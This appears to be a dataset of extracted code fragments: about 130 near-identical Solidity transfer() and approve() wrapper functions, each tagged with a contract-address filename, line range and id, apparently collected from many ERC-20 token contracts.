<source file="systems/source-code/0xE78A151431cC384BC2Dee2dBd5115f58b1A63D6c.sol" startline="70" endline="73" pcid="8365">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xc9e2d2a161445b4602d1908dae1a4ad90e3f1b49.sol" startline="73" endline="76" pcid="7190">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x958e1604174Ea6BD0932ca9E577f01088499897a.sol" startline="74" endline="77" pcid="5449">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xEb91539BFB1eF16F43Dd4E9c81e4d92f56450Cff.sol" startline="81" endline="84" pcid="8587">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xAd222E0eD7193b73694bC09FE40e285F7BADe1F9.sol" startline="70" endline="73" pcid="6265">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xBe43ad4F6F0B27228aC7E54974a57470862FC8Bf.sol" startline="75" endline="78" pcid="6794">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xBe43ad4F6F0B27228aC7E54974a57470862FC8Bf.sol" startline="85" endline="88" pcid="6796">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x5d78329DB4EddA91c08E819b0E6a952ebBD05018.sol" startline="74" endline="77" pcid="3565">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x5d78329DB4EddA91c08E819b0E6a952ebBD05018.sol" startline="84" endline="87" pcid="3567">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x3a862ec30f2b3Ce5419177221E9E1B151AcC0016.sol" startline="83" endline="86" pcid="1952">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x80a2f100cb796a142faca9f6ffc31dabb0b0663f.sol" startline="72" endline="75" pcid="4794">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x958e1604174Ea6BD0932ca9E577f01088499897a.sol" startline="84" endline="87" pcid="5451">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x346708D8507D3114a1fa26E7f5E11aE1ba50dF2a.sol" startline="74" endline="77" pcid="1642">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x6FEDf988195cD0906d8A62D0D55D35cd35D8ef1b.sol" startline="700" endline="703" pcid="4095">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xd4738e9EE70F7C409c5704A8243E2Cf75162098f.sol" startline="84" endline="87" pcid="7579">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xc9e2d2a161445b4602d1908dae1a4ad90e3f1b49.sol" startline="83" endline="86" pcid="7192">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x3c8B8B3D57AE533C8A34A290327024f915335CA9.sol" startline="83" endline="86" pcid="2138">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x73Ff82219f9b9ba3fEbe8aed26C159378D4e00B2.sol" startline="75" endline="78" pcid="4271">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x17E0A45a46FC67d20020128E368637dEA3EFC172.sol" startline="85" endline="88" pcid="733">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x116C9ACc3e70e542b1F2609868Bc4a3000797cb3.sol" startline="74" endline="77" pcid="464">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x4197014b377FDf6a877ED930f16982045285EF96.sol" startline="75" endline="78" pcid="2420">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x2965DC16e5d7525240AFDac5315214170C1dBe26.sol" startline="81" endline="84" pcid="1262">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x96Cf8E9E5FD134a5D00E5471b1a0890f6945425D.sol" startline="73" endline="76" pcid="5469">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xd80f2392f3592471ef0a0163441db092268c19ee.sol" startline="84" endline="87" pcid="7729">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x44b5f46a20c2981d1bae28c3549365b9c6186931.sol" startline="49" endline="52" pcid="2551">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x96Cf8E9E5FD134a5D00E5471b1a0890f6945425D.sol" startline="83" endline="86" pcid="5471">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x346708D8507D3114a1fa26E7f5E11aE1ba50dF2a.sol" startline="84" endline="87" pcid="1644">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xc7C34e07AA5f03f1b231605BfAFaa3A5a35408a0.sol" startline="80" endline="83" pcid="7153">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x89C8Eb764Ae4e7EF67f5E84f0eeE404a2Fb02bed.sol" startline="86" endline="89" pcid="5110">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x30b64f3Ff111F7B1DBD35a92e9a5A7f1395eb2eD.sol" startline="85" endline="88" pcid="1512">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x89C8Eb764Ae4e7EF67f5E84f0eeE404a2Fb02bed.sol" startline="76" endline="79" pcid="5108">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x30b64f3Ff111F7B1DBD35a92e9a5A7f1395eb2eD.sol" startline="75" endline="78" pcid="1510">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x4504921b0d800eca1770f89740b7aaa8f3f57fb9.sol" startline="86" endline="89" pcid="2577">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x07d02e6806fe51ba3488ba0536589cdbd393ff15.sol" startline="1503" endline="1506" pcid="199">
    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x3D9efe658017c9f4e19E61c4dE211FB55B0E47d6.sol" startline="67" endline="70" pcid="2234">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x140682C8B95deC6Bd012303aFc86ca1D55C74E36.sol" startline="87" endline="90" pcid="566">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x55C24F7AdB76f73E9d7FEF837FA0538edBd00280.sol" startline="72" endline="75" pcid="3194">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xfb3FCa7F38fEEAD4CbC677e8Ec4f3C159410ce18.sol" startline="84" endline="87" pcid="9147">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xd6431990d48B3E463696fdc9860f866aFEB1e370.sol" startline="84" endline="87" pcid="7669">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xf157af38701777fc54f34bf6ccde57bb1c364fae.sol" startline="53" endline="56" pcid="8823">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xa5bf4225edeFe7bdA05825b60D5497e2a5445F1e.sol" startline="81" endline="84" pcid="6038">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xe30a4984a2520ddad1560292df4910f1970da26a.sol" startline="80" endline="83" pcid="8186">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x80a2f100cb796a142faca9f6ffc31dabb0b0663f.sol" startline="82" endline="85" pcid="4796">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xa5bf4225edeFe7bdA05825b60D5497e2a5445F1e.sol" startline="71" endline="74" pcid="6036">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x648a2725f5f2Fc16D9c32861cb3045A0D64fF718.sol" startline="79" endline="82" pcid="3792">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x2C898DEc3Fb5e548b771E1A2DA4230ea7989BFF9.sol" startline="70" endline="73" pcid="1310">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x17A5c49Cb48bf49cc10D1Ec05fE899Bb447811Fd.sol" startline="72" endline="75" pcid="716">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x441b741A92A2f35EA521918D3732D7449273EBE5.sol" startline="69" endline="72" pcid="2511">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xA55a6E9BFC3Ba7cb2421146B8F111919bCfB0060.sol" startline="80" endline="83" pcid="6023">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x6a5187F14C2b01BebF7E60A6BCac513D4fc5F144.sol" startline="71" endline="74" pcid="3927">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x4DFcF93A6de72313340eaCd8CD1B481D2c405389.sol" startline="82" endline="85" pcid="2945">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xca1d8fef30539ba8f40e11ad60d8b4a863874266.sol" startline="70" endline="73" pcid="7205">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x97599936D137EFDD11Eaa2989F58f5a00BCd2803.sol" startline="69" endline="72" pcid="5484">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xe75e3c43e328F92a66e787b5e4B81f5A271a78a5.sol" startline="80" endline="83" pcid="8352">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x821d158c454B3a3Fcef1B9f35DBa9cb0e37C5453.sol" startline="73" endline="76" pcid="4858">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x97599936D137EFDD11Eaa2989F58f5a00BCd2803.sol" startline="79" endline="82" pcid="5486">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x4d93ea7ef293ed2ca2d4cc9723f5e2c0c8e09dec.sol" startline="71" endline="74" pcid="2928">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xc4763759BDa9657Cfd06a1613Fc828afD74b70Fa.sol" startline="74" endline="77" pcid="7068">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x983E15495E359Da37330E515D0a4326d502c0356.sol" startline="70" endline="73" pcid="5499">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xf0c0E88a174A69AA98fd48716CdED5cd14a1af22.sol" startline="80" endline="83" pcid="8815">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x892128b76b80C251F79B8F2E2fa300eE7546831A.sol" startline="81" endline="84" pcid="5095">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x983E15495E359Da37330E515D0a4326d502c0356.sol" startline="80" endline="83" pcid="5501">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xDee33C0f9d5395192ec09e6d4B3753015781C26A.sol" startline="79" endline="82" pcid="7992">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x084C028E04F9C7aa04b2CeE80edE5DA2Fa3bbaF2.sol" startline="81" endline="84" pcid="215">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x892128b76b80C251F79B8F2E2fa300eE7546831A.sol" startline="71" endline="74" pcid="5093">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x98B84E0f85ECA20c129095886bC9330Cbe32c605.sol" startline="73" endline="76" pcid="5516">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x98B84E0f85ECA20c129095886bC9330Cbe32c605.sol" startline="83" endline="86" pcid="5518">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xc41c02cd4009b81815af285ab87e4ac171b1e4d2.sol" startline="73" endline="76" pcid="7038">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x98c851496eDaA940DDa018E539a2E4Ef039C5274.sol" startline="71" endline="74" pcid="5531">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xc7C34e07AA5f03f1b231605BfAFaa3A5a35408a0.sol" startline="70" endline="73" pcid="7151">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x88f233078cb6649576a6cbe8bd29a0a3811e5351.sol" startline="81" endline="84" pcid="5080">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x98c851496eDaA940DDa018E539a2E4Ef039C5274.sol" startline="81" endline="84" pcid="5533">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x88f233078cb6649576a6cbe8bd29a0a3811e5351.sol" startline="71" endline="74" pcid="5078">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x3063792385BB315E7016f3E4eFb0560b567DB022.sol" startline="84" endline="87" pcid="1492">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x3063792385BB315E7016f3E4eFb0560b567DB022.sol" startline="74" endline="77" pcid="1490">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x98D29fe112bFce3C568b3e7B56CA95F4f684f2E2.sol" startline="74" endline="77" pcid="5546">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x98D29fe112bFce3C568b3e7B56CA95F4f684f2E2.sol" startline="84" endline="87" pcid="5548">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xff5c2d7Ea91Cb2a88e58E840f24088B5b445834A.sol" startline="84" endline="87" pcid="9349">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x4701BD9e462012bC2A6D9e6aD71a132d7b64dF7d.sol" startline="81" endline="84" pcid="2676">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xA55a6E9BFC3Ba7cb2421146B8F111919bCfB0060.sol" startline="70" endline="73" pcid="6021">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xfb3FCa7F38fEEAD4CbC677e8Ec4f3C159410ce18.sol" startline="74" endline="77" pcid="9145">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x3505c70Dbf2Cc4ECD84Dd0Bed04f8126c26Ab909.sol" startline="77" endline="80" pcid="1668">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xfFc50B460871D6dF13CA15F24c29cB646B6606f5.sol" startline="84" endline="87" pcid="9364">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x73f3b1b22f21222c593195558a8c76558f1e8ce8.sol" startline="71" endline="74" pcid="4256">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x59C507Cb69406B5975e70A3c3993AF74c11EF51d.sol" startline="74" endline="77" pcid="3389">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xca1d8fef30539ba8f40e11ad60d8b4a863874266.sol" startline="80" endline="83" pcid="7207">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x508D2342902B5D12154dCC7485c1a80242D7AEA9.sol" startline="84" endline="87" pcid="2979">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x17A5c49Cb48bf49cc10D1Ec05fE899Bb447811Fd.sol" startline="82" endline="85" pcid="718">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xd6431990d48B3E463696fdc9860f866aFEB1e370.sol" startline="74" endline="77" pcid="7667">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xE36B83Ff8Ae143A1Ee1E960968C37c5Bd4DA8438.sol" startline="81" endline="84" pcid="8262">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x4701BD9e462012bC2A6D9e6aD71a132d7b64dF7d.sol" startline="71" endline="74" pcid="2674">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x1cFdab1D6685C85C299503BD1d3C6bab5e5933a1.sol" startline="102" endline="105" pcid="915">
    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xf0c0E88a174A69AA98fd48716CdED5cd14a1af22.sol" startline="70" endline="73" pcid="8813">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xc41c02cd4009b81815af285ab87e4ac171b1e4d2.sol" startline="83" endline="86" pcid="7040">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x2C898DEc3Fb5e548b771E1A2DA4230ea7989BFF9.sol" startline="80" endline="83" pcid="1312">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x1A2d73a3c991da558bcAeE1f02408fe5a9471afa.sol" startline="81" endline="84" pcid="837">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x4cb7fa2798f47c0531601d8fc33a2F1062b9B0c9.sol" startline="84" endline="87" pcid="2900">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x4504921b0d800eca1770f89740b7aaa8f3f57fb9.sol" startline="76" endline="79" pcid="2575">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x3505c70Dbf2Cc4ECD84Dd0Bed04f8126c26Ab909.sol" startline="87" endline="90" pcid="1670">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x888Ab493a44007445eBc70d5537eb29f95A2D3eC.sol" startline="86" endline="89" pcid="5065">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x571d1b19e4eaDC8840499d3A408a4CD3fa31f5A6.sol" startline="78" endline="81" pcid="3276">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x020b7C91ca0C63477DF2f68ac47A6c41a370CE37.sol" startline="72" endline="75" pcid="67">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x26aC04336C1A7ad637c1ab4578A59ce17E1d9Fd9.sol" startline="72" endline="75" pcid="1222">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x46e743046dccf9ab65b8454cdf879187aab5dd49.sol" startline="85" endline="88" pcid="2661">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xD53bd4D2a303F2D046C94C3553d0a34E903a9Afb.sol" startline="80" endline="83" pcid="7624">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x6aEcF2403283336E1644ee3018c01676f149994B.sol" startline="173" endline="176" pcid="3944">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x98dBba70df94bC4057a76E29067b5D5D5676f14c.sol" startline="74" endline="77" pcid="5561">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x4c9AE7Cbc12242F162DdeAab10B57Fff01AF836d.sol" startline="71" endline="74" pcid="2883">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x888Ab493a44007445eBc70d5537eb29f95A2D3eC.sol" startline="76" endline="79" pcid="5063">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xeA9E312E409599e3cCd50Ff1A8F9e742D60C463B.sol" startline="73" endline="76" pcid="8533">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x550f95a80e42c5cfBc786C5C47322862e0332528.sol" startline="73" endline="76" pcid="3179">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x4D8c3df04Ce9B909c9FBF4347A5a3fFAdf190142.sol" startline="84" endline="87" pcid="2915">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xde0c85748435e9413a95aD4ED9f1c1fCe22685A9.sol" startline="81" endline="84" pcid="7932">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x98dBba70df94bC4057a76E29067b5D5D5676f14c.sol" startline="84" endline="87" pcid="5563">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x99818798AedD80Fef824086eF10411C89009e174.sol" startline="72" endline="75" pcid="5576">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x4C3c01Be6fb38419cE6b1F6782d751c5bE6D7751.sol" startline="72" endline="75" pcid="2868">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xA49E5b1422AB286CFC8D54E0A7CBBdb3cd5aBFdB.sol" startline="85" endline="88" pcid="5979">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xA49E5b1422AB286CFC8D54E0A7CBBdb3cd5aBFdB.sol" startline="75" endline="78" pcid="5977">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x6301C00FADD94F10409FC62E08215253fB838F46.sol" startline="81" endline="84" pcid="3777">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xf34839a7431d6c70673f3a3bcfb589c042fd219d.sol" startline="77" endline="80" pcid="8854">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xf49f16cd3370fB4cCD6C99e1C6F465d53fdec793.sol" startline="74" endline="77" pcid="8912">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x6e7C09630F36B5f34459750c9717C4De1AE94165.sol" startline="70" endline="73" pcid="4062">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xc49a9fe7c7B41545edfF6B2F2be7662EB588279C.sol" startline="146" endline="149" pcid="7080">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x81069fF4cb59B3814F5d949A957a686501da2cf5.sol" startline="70" endline="73" pcid="4828">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x7639F0fCD891a5c1D72A986258580Bb28c12A94E.sol" startline="84" endline="87" pcid="4405">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x156ba8A652411cd1F4fFbdA89f96172d5C76bD3A.sol" startline="145" endline="148" pcid="615">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x81069fF4cb59B3814F5d949A957a686501da2cf5.sol" startline="80" endline="83" pcid="4830">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
